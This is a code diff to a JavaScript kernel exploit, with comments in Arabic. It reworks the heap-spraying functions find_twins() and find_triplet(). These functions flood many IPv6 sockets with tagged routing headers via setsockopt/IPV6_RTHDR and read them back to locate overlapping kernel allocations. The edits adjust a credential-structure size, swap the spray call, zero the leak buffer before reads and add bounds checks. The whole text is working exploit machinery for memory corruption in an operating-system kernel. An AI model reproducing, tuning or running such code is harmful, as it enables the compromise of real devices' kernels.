@@ -108,7 +108,7 @@ var CPU_SET_SIZE = 0x10;
 var PIPEBUF_SIZE = 0x20;
 var MSG_HDR_SIZE = 0x30;
 var FILEDESCENT_SIZE = 0x8;
-var UCRED_SIZE = 0x168;
+var UCRED_SIZE = 0x40;
 var RTHDR_TAG = 0x13370000;
 var UIO_IOV_NUM = 0x14; // 20
 var MSG_IOV_NUM = 0x17; // 23
@@ -898,9 +898,6 @@ function find_twins() {
     } else {
       zeroMemoryCount = 0;
     }
-    if (count % 10 === 0) {
-      // debug("find_twins iteration: " + count);
-    }
     // ============================================================
     // 3) المرحلة الأولى: الكتابة (أكبر مصدر ضغط)
     //
@@ -922,11 +919,11 @@ function find_twins() {
       read32(spray_add);
 
       // ← ← ← أهم سطر ضغط في الدالة كلها
-      set_rthdr(ipv6_socks[i], spray_rthdr, spray_rthdr_len);
+      //set_rthdr(ipv6_socks[i], spray_rthdr, spray_rthdr_len);
       // ↑ ↑ ↑ كل استدعاء = allocation جديد
       // Using pre-filled buffer to spray
       // set_rthdr(ipv6_socks[i], spray_rthdr_rop.add(i*UCRED_SIZE), spray_rthdr_len);
-      // setsockopt(ipv6_socks[i], IPPROTO_IPV6, IPV6_RTHDR, spray_rthdr_rop.add(i*UCRED_SIZE), spray_rthdr_len);
+      setsockopt(ipv6_socks[i], IPPROTO_IPV6, IPV6_RTHDR, spray_rthdr_rop.add(i*UCRED_SIZE), spray_rthdr_len);
     }
     // ============================================================
     // 4) المرحلة الثانية: القراءة + القرار
@@ -934,7 +931,13 @@ function find_twins() {
     // ============================================================
     for (i = 0; i < ipv6_socks.length; i++) {
 
+      if (ipv6_socks[i].eq(BigInt_Error))
+        continue;
+
       log("\n[READ] sock=" + i);
+
+      // تصفير قبل القراءة
+      write32(leak_add, 0);
 
       // قراءة من النظام
       get_rthdr(ipv6_socks[i], leak_rthdr, 8);
@@ -948,14 +951,17 @@ function find_twins() {
           " idx=" + j);
 
       var condition =
-        ((val & 0xFFFF0000) === RTHDR_TAG) && (i !== j);
+        ((val & 0xFFFF0000) === RTHDR_TAG) &&
+        (i !== j) &&
+        (j >= 0) &&
+        (j < ipv6_socks.length);
 
       log("[CHECK] i=" + i + " j=" + j + " cond=" + condition);
 
       if (condition) {
+        log("\n🔥🔥🔥 [TWINS-FOUND] i=" + i + " j=" + j + " 🔥🔥🔥\n");
         twins[0] = i;
         twins[1] = j;
-        log("\n🔥🔥🔥 [TWINS-FOUND] i=" + i + " j=" + j + " 🔥🔥🔥\n");
         return true;
       }
 
@@ -965,6 +971,8 @@ function find_twins() {
     count++;
   }
 
+  twins[0] = -1;
+  twins[1] = -1;
   return false;
 }
 function find_triplet(master, other, iterations) {
@@ -983,6 +991,7 @@ function find_triplet(master, other, iterations) {
 
       set_rthdr(ipv6_socks[i], spray_rthdr, spray_rthdr_len);
     }
+    write32(leak_add, 0); // تعديل رقم 4
     get_rthdr(ipv6_socks[master], leak_rthdr, 8);
     val = read32(leak_add);
     j = val & 0xFFFF;
